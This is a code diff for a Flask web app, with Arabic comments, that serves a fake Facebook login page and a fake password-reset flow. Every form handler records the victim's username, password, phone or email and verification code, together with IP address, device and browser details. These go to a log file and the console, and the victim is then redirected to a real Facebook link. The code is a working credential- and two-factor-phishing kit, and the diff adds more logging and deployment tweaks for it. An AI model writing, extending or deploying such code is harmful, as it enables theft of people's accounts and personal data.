@@ -1,9 +1,15 @@
 from flask import Flask, request, redirect, render_template
 from datetime import datetime
 from flask import send_from_directory, session
-
+import os
+print("""" +++++++++++++++++++++++++++++++++++++++++++++++++++
+____________________________Server started__________________________
+           +++++++++++++++++++++++++++++++++++++++++++++++++++""")
 app = Flask(__name__)
 app.secret_key = "secret123"
+
+# مسار log.txt الصحيح (مهم جداً لـ Render)
+log_path = os.path.join(os.path.dirname(__file__), "log.txt")
 
 # ========================
 # Favicon
@@ -13,12 +19,23 @@ def favicon():
     return send_from_directory('static', 'favicon.ico')
 
 
+
+#=========================
+# Ping 
+#=========================
+@app.route("/ping")
+def ping():
+    return "OK"
+
 # ========================
 # الصفحة الرئيسية
 # ========================
 @app.route("/")
 def home():
-    return render_template("FacebookForm.html")
+    print("(DONE) User opened the homepage")
+    result = render_template("FacebookForm.html")
+    print("(DONE) User get (FacebookForm.html)")
+    return result
 
 
 # ========================
@@ -27,7 +44,6 @@ def home():
 def detect_device(user_agent):
     ua = user_agent.lower()
 
-    # نوع الجهاز
     if "android" in ua or "iphone" in ua:
         device = "Mobile Phone"
     elif "ipad" in ua or "tablet" in ua:
@@ -35,19 +51,17 @@ def detect_device(user_agent):
     else:
         device = "Computer"
 
-    # نظام التشغيل
     if "windows" in ua:
-        os = "Windows"
+        os_name = "Windows"
     elif "android" in ua:
-        os = "Android"
+        os_name = "Android"
     elif "iphone" in ua or "ios" in ua:
-        os = "iOS"
+        os_name = "iOS"
     elif "mac" in ua:
-        os = "MacOS"
+        os_name = "MacOS"
     else:
-        os = "Unknown"
+        os_name = "Unknown"
 
-    # المتصفح
     if "chrome" in ua:
         browser = "Chrome"
     elif "firefox" in ua:
@@ -57,7 +71,7 @@ def detect_device(user_agent):
     else:
         browser = "Unknown"
 
-    return device, os, browser
+    return device, os_name, browser
 
 
 # ========================
@@ -68,30 +82,34 @@ def login():
     username = request.form.get("username")
     password = request.form.get("password")
 
+    print(f"User tried to login with username : {username} and password : {password}")
+
     ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
     referrer = request.headers.get("Referer", "Direct")
 
-    device, os, browser = detect_device(user_agent)
+    device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # حفظ بيانات login
     log_data = f"""
 Username/Email: {username}
 Password: {password}
 IP Address: {ip}
 Device Type: {device}
-Operating System: {os}
+Operating System: {os_name}
 Browser: {browser}
 User-Agent: {user_agent}
 Referrer: {referrer}
 Time: {time}
 --------------------------------
 """
-    with open("log.txt", "a", encoding="utf-8") as file:
+
+    with open(log_path, "a", encoding="utf-8") as file:
         file.write(log_data)
 
-    return redirect("https://www.facebook.com/share/r/14XdVmsrfeE/")
+    login_botton_url = "https://www.facebook.com/share/r/14XdVmsrfeE/"
+    print(f"(DONE) User entered url : {login_botton_url}")
+    return redirect(login_botton_url)
 
 
 # ========================
@@ -99,7 +117,10 @@ Time: {time}
 # ========================
 @app.route("/create")
 def create():
-    return redirect("https://ygyug.com")
+    print("User clicked on create new acount")
+    create_url = "https://www.fhyi.com"
+    print(f"User opened url : {create_url}")
+    return redirect(create_url)
 
 
 # ========================
@@ -107,26 +128,29 @@ def create():
 # ========================
 @app.route("/forgot")
 def forgot():
-    # عرض النموذج لإدخال البريد أو الهاتف
-    return render_template("forgot.html")
+    print("User opened forgot password page")
+    result = render_template("forgot.html")
+    print("(DONE) User get (forgot.html)")
+    return result
 
 
 # ========================
-# حفظ البريد/الهاتف من forgot.html وعرض verify.html
+# verify
 # ========================
 @app.route("/verify", methods=["POST"])
 def verify():
 
     phone_or_email = request.form.get("phone_or_email")
 
-    # حفظ البريد أو الرقم في session
+    # حفظ في session
     session["phone_or_email"] = phone_or_email
+
+    print(f"User entered phone/email : {phone_or_email}")
 
     ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
 
-    device, os, browser = detect_device(user_agent)
-
+    device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     log_data = f"""
@@ -135,7 +159,7 @@ Phone/Email: {phone_or_email}
 
 IP Address: {ip}
 Device Type: {device}
-Operating System: {os}
+Operating System: {os_name}
 Browser: {browser}
 User-Agent: {user_agent}
 
@@ -143,28 +167,30 @@ Time: {time}
 --------------------------------
 """
 
-    with open("log.txt", "a", encoding="utf-8") as file:
+    with open(log_path, "a", encoding="utf-8") as file:
         file.write(log_data)
 
-    return render_template("verify.html")
+    result = render_template("verify.html")
+    print("(DONE) User get (verify.html)")
+    return result
 
 
 # ========================
-# حفظ رمز التحقق من verify.html
+# verify_code
 # ========================
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
 
     code = request.form.get("code")
 
-    # استرجاع البريد أو الرقم من session
+    print(f"(DONE) User entered a verification code : {code}")
+
     phone_or_email = session.get("phone_or_email")
 
     ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
 
-    device, os, browser = detect_device(user_agent)
-
+    device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     log_data = f"""
@@ -175,7 +201,7 @@ Code: {code}
 
 IP Address: {ip}
 Device Type: {device}
-Operating System: {os}
+Operating System: {os_name}
 Browser: {browser}
 User-Agent: {user_agent}
 
@@ -183,14 +209,18 @@ Time: {time}
 --------------------------------
 """
 
-    with open("log.txt", "a", encoding="utf-8") as file:
+    with open(log_path, "a", encoding="utf-8") as file:
         file.write(log_data)
 
+    print("(DONE) User get : (تم تسجيل الرمز بنجاح)")
+    print("Everything is done")
+
     return "تم تسجيل الرمز (اختبار)"
+
 
 # ========================
 # تشغيل السيرفر
 # ========================
 if __name__ == "__main__":
     print("Server is running...")
-    app.run(host="0.0.0.0", port=5000)
+    app.run()
